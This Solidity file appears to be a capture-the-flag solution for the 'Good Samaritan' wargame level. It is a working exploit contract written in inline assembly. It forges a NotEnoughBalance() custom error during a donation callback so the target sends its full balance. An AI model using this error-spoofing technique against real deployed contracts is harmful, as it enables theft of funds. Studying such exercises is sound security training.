// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanExploit is INotifyable {
    error NotEnoughBalance();

    function exploit(address samaritan) external {
        // (bool success, ) = samaritan.call(abi.encodeWithSignature("requestDonation()"));
        // require(success, "call to requestDonation failed");

        assembly {
            mstore(0, "requestDonation()")
            mstore(0, keccak256(0, 17))
            let success := call(gas(), samaritan, 0, 0, 4, 0, 0)
            if iszero(success) {
                let fmp := mload(0x40)
                mstore(fmp, "Error(string)")
                mstore(fmp, keccak256(fmp, 13))
                mstore(add(fmp, 4), 0x20)
                mstore(add(fmp, 0x24), 30)
                mstore(add(fmp, 0x44), "call to requestDonation failed")
                revert(fmp, 0x64)
            }
        }
    }

    function notify(uint256 amount) external {
        // if (amount == 10) revert NotEnoughBalance();

        assembly {
            if eq(amount, 10) {
                mstore(0, "NotEnoughBalance()")
                mstore(0, keccak256(0, 18))
                revert(0, 4)
            }
        }
    }
}
